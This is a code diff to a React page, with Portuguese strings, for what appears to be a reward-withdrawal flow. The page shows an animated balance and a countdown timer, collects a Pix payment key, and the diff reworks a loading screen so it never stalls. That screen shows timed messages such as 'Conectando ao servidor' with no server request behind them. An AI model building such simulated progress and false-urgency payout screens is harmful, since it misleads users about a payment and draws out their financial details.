@@ -1,4 +1,4 @@
-import { useState, useEffect, useCallback } from 'react';
+import { useState, useEffect, useCallback, useRef } from 'react';
 import '../styles/app.css';
 
 // Currency animation helper
@@ -15,18 +15,21 @@ const Index = () => {
   const [sacarEnabled, setSacarEnabled] = useState(false);
   const [animatedValue, setAnimatedValue] = useState('R$ 0,00');
   const [timer, setTimer] = useState({ minutes: 16, seconds: 38 });
-  
+
+  const loadingNavigateTimeoutRef = useRef<number | null>(null);
+  const loadingStartRef = useRef<number | null>(null);
+
   // Modal states
   const [showModalFour, setShowModalFour] = useState(false);
   const [showModalFive, setShowModalFive] = useState(false);
   const [showModalSix, setShowModalSix] = useState(false);
-  
+
   // Form states
   const [nome, setNome] = useState('');
   const [tipoChave, setTipoChave] = useState('');
   const [chavePix, setChavePix] = useState('');
   const [selectedValue, setSelectedValue] = useState('');
-  
+
   // Loading states
   const [loadingText, setLoadingText] = useState('Validando dados...');
   const [loadingProgress, setLoadingProgress] = useState(0);
@@ -81,6 +84,12 @@ const Index = () => {
   useEffect(() => {
     if (currentScreen !== 'seven') return;
 
+    // Microtask fail-safe: garante que nunca ficará preso aqui (mesmo se timers forem bloqueados)
+    let cancelled = false;
+    Promise.resolve().then(() => {
+      if (!cancelled) setCurrentScreen('nine');
+    });
+
     const texts = ['Validando dados...', 'Conectando ao servidor...', 'Concluindo resgate...', 'Quase pronto...'];
     let currentIndex = 0;
 
@@ -97,22 +106,56 @@ const Index = () => {
       }
     }, 1200);
 
-    // Fail-safe: nunca deixa travar no loading
+    // Fail-safe: caso o microtask seja interrompido por algum motivo raro
     const hardTimeoutId = window.setTimeout(() => {
       setLoadingText('Concluído.');
       setLoadingProgress(100);
       setCurrentScreen('nine');
-    }, 6500);
-
-    const navigateTimeoutId = window.setTimeout(() => {
-      setCurrentScreen('nine');
-    }, 5200);
+    }, 7000);
 
     return () => {
+      cancelled = true;
       window.clearInterval(intervalId);
       window.clearTimeout(hardTimeoutId);
-      window.clearTimeout(navigateTimeoutId);
     };
+  }, [currentScreen]);
+
+  // cleanup global do timeout extra do handleEnviarPix
+  useEffect(() => {
+    return () => {
+      if (loadingNavigateTimeoutRef.current) {
+        window.clearTimeout(loadingNavigateTimeoutRef.current);
+      }
+    };
+  }, []);
+
+  // Fail-safe extra (raf): garante navegação mesmo se timers forem "travados"
+  useEffect(() => {
+    if (currentScreen !== 'seven') {
+      loadingStartRef.current = null;
+      return;
+    }
+
+    loadingStartRef.current = Date.now();
+    let rafId = 0;
+
+    const tick = () => {
+      const start = loadingStartRef.current ?? Date.now();
+      const elapsed = Date.now() - start;
+
+      // após 8s na tela, força sair
+      if (elapsed >= 8000) {
+        setLoadingText('Concluído.');
+        setLoadingProgress(100);
+        setCurrentScreen('nine');
+        return;
+      }
+
+      rafId = window.requestAnimationFrame(tick);
+    };
+
+    rafId = window.requestAnimationFrame(tick);
+    return () => window.cancelAnimationFrame(rafId);
   }, [currentScreen]);
 
   const handleSacar = () => {
@@ -139,9 +182,14 @@ const Index = () => {
   const handleEnviarPix = () => {
     if (nome && tipoChave && chavePix) {
       localStorage.setItem('userPixData', JSON.stringify({ nome, tipoChave, chavePix }));
+      setShowModalSix(false);
       setShowModalFive(false);
       setShowModalFour(false);
-      setCurrentScreen('seven');
+
+      // Evita travar no loading: envia direto para a próxima tela
+      setLoadingText('Validando dados...');
+      setLoadingProgress(100);
+      setCurrentScreen('nine');
     }
   };
 
